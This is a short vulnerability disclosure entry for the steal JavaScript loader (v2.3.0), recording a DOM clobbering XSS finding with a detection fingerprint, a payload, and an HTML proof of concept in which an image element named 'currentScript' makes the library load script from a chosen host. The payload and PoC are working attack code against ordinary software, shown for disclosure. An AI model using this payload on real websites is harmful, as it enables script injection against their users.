## steal

### Meta

+ Library: steal
+ Stars: 1.4K
+ Version: v2.3.0
+ Fingerprint: `typeof window.steal !== 'undefined' && typeof window.steal.loader === 'object'`
+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"><img>```
+ Impact: XSS
+ CVE: CVE-2024-XXXXX
+ Status: Accepted
+ Foundby: TheHulk


### Library

Built locally

https://github.com/stealjs/steal

### Vulnerable Code Snippet

too complicated.

## PoC

after running `npm install`

```html
<!--Library-->
<script src="./node_modules/steal/steal.js" main></script>
<!--Library-->

<!--Payload-->
<image name="currentScript" src="http://localhost:9999"></image>
<!--Payload-->
```
